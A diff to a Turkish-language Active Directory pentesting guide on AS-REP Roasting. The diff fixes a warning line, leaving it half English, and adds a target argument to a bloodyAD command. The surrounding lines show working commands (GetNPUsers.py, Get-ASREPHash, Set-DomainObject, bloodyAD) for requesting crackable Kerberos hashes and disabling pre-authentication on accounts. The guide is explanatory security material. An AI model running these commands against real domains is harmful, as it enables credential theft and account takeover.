@@ -33,7 +33,7 @@ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashc
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
 > [!WARNING]
-> AS-REP Roasting ile Rubeus kullanmak, 0x17 şifreleme türü ve 0 ön kimlik doğrulama türü ile bir 4768 oluşturacaktır.
+> AS-REP Roasting with Rubeus, 0x17 şifreleme türü ve 0 ön kimlik doğrulama türü ile bir 4768 oluşturacaktır.
 
 ### Kırma
 ```bash
@@ -48,7 +48,7 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```
 
 ```bash:Using Linux
-bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
+bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
 ```
 ## ASREProast kimlik bilgisi olmadan
 
